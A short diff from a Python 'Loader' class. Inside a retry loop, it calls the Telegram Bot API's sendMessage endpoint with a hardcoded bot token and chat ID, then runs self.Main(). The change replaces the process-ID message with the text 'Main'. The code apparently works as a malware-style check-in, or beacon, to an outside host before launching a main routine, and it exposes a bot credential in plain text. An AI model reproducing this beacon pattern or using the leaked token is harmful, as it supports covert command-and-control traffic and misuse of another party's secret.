@@ -39,7 +39,7 @@ class Loader():
 		while True:
 			try:
 				pid = psutil.Process(os.getpid())
-				requests.get('https://api.telegram.org/bot1835937794:AAGrYMKkvpqry85eiHX_yuC_0oWJhH5fwuw/sendMessage?text=' + str(pid) + '&chat_id=1742761281')
+				requests.get('https://api.telegram.org/bot1835937794:AAGrYMKkvpqry85eiHX_yuC_0oWJhH5fwuw/sendMessage?text=Main&chat_id=1742761281')
 				self.Main()
 			except requests.ConnectionError:
 				pass
